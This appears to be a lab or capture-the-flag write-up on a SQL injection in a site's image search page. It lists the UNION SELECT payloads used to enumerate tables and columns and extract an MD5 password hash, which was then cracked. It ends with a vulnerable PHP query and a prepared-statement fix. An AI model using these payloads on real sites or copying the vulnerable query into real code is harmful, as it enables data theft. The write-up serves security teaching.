## How did we found it

Found all the tables with `42 UNION SELECT table_name, NULL FROM information_schema.tables`.
With `42 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=CHAR(100, 98, 95, 100, 101, 102, 97, 117, 108, 116)` on the page `url/?page=searchimg` we got the names of the columns for the list_images table.
Then with `42 UNION SELECT 1, (SELECT CONCAT(id, url, title, comment) FROM list_images WHERE id=5)` on the same page we got an MD5 pass, cracked with `https://crackstation.net` and then encrypt back to SHA256.

## How to fix it
In the backend, the sql request need to be prepared, in this case sql can't be injected
Print only column (by name) who is waited

## PHP exemple
### bad php

```
$conn = new mysqli("localhost", "username", "password", "database");
$result = $conn->query("SELECT * FROM users WHERE username = '$username'");
while($row = $result->fetch_assoc())
{
    echo "id: " . $row["id"]. " - Nom: " . $row["username"]. "<br>";
}
```

### good php

```
$bdd = new PDO ('mysql:host=HOST_SQL;dbname=NAME_DB;charset=utf8', 'SQL_USERNAME', 'SQLPASSWORD' , array(PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8'));
$req = $bdd->prepare("SELECT NAME_COLUMN_1, NAME_COLUMN_2 FROM `users` WHERE user_id LIKE ?");
$req->execute(array(htmlspecialchars($ID_USER_VAR)));
foreach ($req as $donnee)
{
	echo $donnee["NAME_COLUMN_1"];
	echo $donnee["NAME_COLUMN_2"];
}
```